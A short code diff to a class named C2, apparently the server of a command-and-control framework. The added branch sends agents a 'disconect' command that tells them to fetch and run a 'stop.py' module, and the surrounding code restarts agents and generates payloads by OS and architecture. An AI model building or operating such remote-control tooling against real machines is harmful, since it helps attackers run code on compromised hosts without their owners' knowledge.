@@ -223,6 +223,10 @@ class C2:
             for uid in uids:
                 self.sio.emit("restart", uid)
 
+        if explotation_module_type == "disconect":
+            for uid in uids:
+                self.sio.emit("pem", {"uid": uid, "url": "client/pem/stop.py"})
+
     def generate(self, generate):
         os_name = generate["os"]
         arch = generate["arch"]
